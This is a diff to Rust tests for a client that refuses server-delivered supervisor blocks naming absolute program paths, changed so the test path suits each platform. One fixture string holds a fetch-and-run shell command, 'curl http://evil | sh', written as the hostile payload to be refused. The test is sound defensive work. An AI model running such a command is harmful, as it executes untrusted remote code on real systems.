@@ -431,12 +431,26 @@ mod tests {
     /// whole — that is the machine's own process, and letting the Server spawn one would run
     /// arbitrary code that never passed through package signing. The refusal names the block and the
     /// path, and (being a validation failure) leaves the running set and the file untouched.
+    /// An absolute path that is genuinely absolute on the host running the test — a Unix path is
+    /// only drive-relative on Windows, which resolves to a different refusal, so each platform uses
+    /// its own. Forward slashes keep it a plain TOML string and are absolute on Windows all the same.
+    fn machine_program() -> &'static str {
+        if cfg!(windows) {
+            "C:/Windows/System32/cmd.exe"
+        } else {
+            "/bin/sh"
+        }
+    }
+
     #[test]
     fn a_server_delivered_block_may_not_name_an_absolute_program() {
+        let program = machine_program();
         let offer = offer_of(&[(
             "fleet",
-            "[[supervisor]]\ntype = \"command\"\nname = \"shell\"\n\
-             command = \"/bin/sh\"\nargs = [\"-c\", \"curl http://evil | sh\"]\n",
+            &format!(
+                "[[supervisor]]\ntype = \"command\"\nname = \"shell\"\n\
+                 command = \"{program}\"\nargs = [\"-c\", \"curl http://evil | sh\"]\n"
+            ),
         )]);
         let (blocks, _) = offered_blocks(&offer).expect("parse");
         let mut config: ClientConfig = toml::from_str("").expect("config");
@@ -445,7 +459,7 @@ mod tests {
         let err = validate_offered_block(&config, &blocks[0]).expect_err("absolute path refused");
         assert!(err.contains("\"shell\""), "names the block: {err}");
         assert!(err.contains("only a program this Client owns"), "{err}");
-        assert!(err.contains("/bin/sh"), "names the path: {err}");
+        assert!(err.contains(program), "names the path: {err}");
     }
 
     /// The counterpart: a bare file name is a program this Client owns (ADR-0021), so a delivered
@@ -467,10 +481,12 @@ mod tests {
     /// absolute path is the machine's Collector, refused on the delivery path just like `command`.
     #[test]
     fn a_delivered_collector_binary_must_be_owned_too() {
+        let program = machine_program();
         let offer = offer_of(&[(
             "fleet",
-            "[[supervisor]]\ntype = \"collector\"\nname = \"otelcol\"\n\
-             binary = \"/usr/local/bin/otelcol\"\n",
+            &format!(
+                "[[supervisor]]\ntype = \"collector\"\nname = \"otelcol\"\nbinary = \"{program}\"\n"
+            ),
         )]);
         let (blocks, _) = offered_blocks(&offer).expect("parse");
         let mut config: ClientConfig = toml::from_str("").expect("config");
@@ -478,7 +494,7 @@ mod tests {
 
         let err = validate_offered_block(&config, &blocks[0]).expect_err("absolute binary refused");
         assert!(err.contains("only a program this Client owns"), "{err}");
-        assert!(err.contains("/usr/local/bin/otelcol"), "{err}");
+        assert!(err.contains(program), "{err}");
     }
 
     /// The composed map may spread blocks over several entries (one per matching Configuration);
